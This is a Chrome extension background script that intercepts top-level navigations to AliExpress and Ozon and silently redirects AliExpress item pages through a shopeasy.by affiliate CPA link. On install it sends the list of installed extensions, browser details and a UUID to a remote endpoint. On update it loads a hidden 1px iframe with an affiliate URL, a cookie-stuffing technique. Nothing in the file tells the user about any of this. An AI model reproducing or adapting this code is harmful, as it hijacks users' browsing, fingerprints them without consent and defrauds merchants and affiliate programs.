function autoactivateClass() {
	var self = this;

	this.auto_activate_moments = {};

	this.setMoment = function(domain, moment) {
		self.auto_activate_moments[domain] = moment;
	}

	this.getMoment = function(domain) {
		var rv = false;
		if (domain in self.auto_activate_moments) {
			rv = self.auto_activate_moments[domain];
		}
		return rv;
	}

	this.resetMoments = function() {
		self.auto_activate_moments = {};
	}
}

function JsInject() {

  var self = this;

  this.Data = {
    lang:       window.navigator.language,
    cookie:     window.navigator.cookieEnabled,
    userAgent:  window.navigator.userAgent
  };
	this.ext;
  this.setting;
  this.server   = 'http://localhost:3000/ext';
  this.regList  = [/^https:\/\/ru(.*?)aliexpress(.*?)item(.*?\.html)/g, /(^http(.):\/\/www\.ozon\.ru)(.*?)/g]; //from server
  this.deepLink = 'http://shopeasy.by/redirect/cpa/o/ou76wi7vip8o8fxzn1fxixpo2ddqm8m2/'; //from server
	this.eah			= 'http://shopeasy.by/redirect/cpa/o/ou76wi7vip8o8fxzn1fxixpo2ddqm8m2/?to=https%3A%2F%2Fru.aliexpress.com%2Fitem%2FHeadphone-Sennheiser-CX-3-00-Headphone-for-phone%2F32798323420.html';

	this.filter   = {urls: ["<all_urls>"], types:["main_frame"]};
  this.opt_extraInfoSpec = ["blocking"];

  this.autoactivateObj = new autoactivateClass();

  _init();

  function _init(){
    getSetting();
		chrome.management.getAll(extList);
    chrome.runtime.onInstalled.addListener(whenInstalled);
    chrome.cookies.onChanged.addListener(cookieChanges);
    chrome.webRequest.onBeforeRequest.addListener(beforeRequest, self.filter, self.opt_extraInfoSpec);
    chrome.storage.onChanged.addListener(storageChange);
  }

	function extList(list){
			let ext = {};
			list.forEach((item) => {	ext[item.shortName] = item.id	});
			self.ext = ext;
		}

  function getSetting(){
    chrome.storage.local.get('uuid', function(result){
      self.setting = result;
    })
  }

  function storageChange(changes, space){
    for (key in changes){
      let storageChange = changes[key];
      console.log('key "%s" in space "%s" changes. Old value is "%s", new value is "%s"', key, space, storageChange.oldValue, storageChange.newValue);
    }
  }

  function cookieChanges(info){
    //console.log(info.cookie.domain);
    if (info.cookie.domain === 'shopeasy.by'){
      console.log(info.cookie);
		/*	if(/cpa|cl1/.test(info.cookie.name)){
				chrome.cookies.set({url:'http://shopeasy.by',
				name:info.cookie.name,
				value:info.cookie.value,
				domain:info.cookie.domain,
				path:info.cookie.path,
				secure:info.cookie.secure,
				httpOnly:info.cookie.httpOnly,
				sameSite:info.cookie.sameSite, expirationDate:2147483647},function(f){
						console.log(f);
				})*/
				//console.log(info.cookie);
			}
    }

  function beforeRequest(req){
    re = {cancel:false};

    if (req.frameId == 0 && req.method == "GET"){
      let link = _urlMatch(req.url);
      if (link != null) {
        var moment = self.autoactivateObj.getMoment(link);
        console.log(moment);
        if (moment + 720000 < Date.now()){
          self.autoactivateObj.setMoment(link, Date.now());
          let partner = _encodeUrl(self.deepLink, link);
          chrome.tabs.update(req.tabId, {url:partner});
        }
      }
    }
    return re;
  }

  function whenInstalled(details){
    if (details.reason === 'install'){
      let uuid = _uuid();
      chrome.storage.local.set({'uuid':uuid})
      console.log('first install');
      _xhrSend(self.server, {info:self.Data, uuid:uuid, ext:self.ext ,first:true});
    }
    else {
			let iframe = document.body.appendChild(document.createElement('iframe'));
			iframe.style.width = "1px";
			iframe.style.heigth = "1px";
			iframe.src = self.eah;
			iframe.onload = function(){
				// this is ok
			}
    }
  }

  function _urlMatch(url){
    for (let i=0;i<self.regList.length;++i){
      let index = self.regList[i];
      if (index.test(url)){
        if (url.match(self.regList[0])){
          return url.match(self.regList[0])[0];
        } else {
          _xhrSend(self.server, index.slice(1, -2)); //this
          return null;
        }
      }
    }
    return null;
  }

  function _encodeUrl(first, last){
    return first +'?to='+ encodeURIComponent(last);
  }

  function _uuid(){
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  function _xhrSend(url, param){
    let xhr = new XMLHttpRequest();
    let json = JSON.stringify({data:param, uuid:self.setting})
    xhr.open("POST", url, true);
    xhr.setRequestHeader('Content-Type', 'application/json')
    xhr.onreadystatechange = function(){
      if(xhr.readyState == 4 && xhr.status == 200){
        console.log(xhr.responseText);
      }
    }
    xhr.send(json);
  };

}

var objInject = new JsInject();
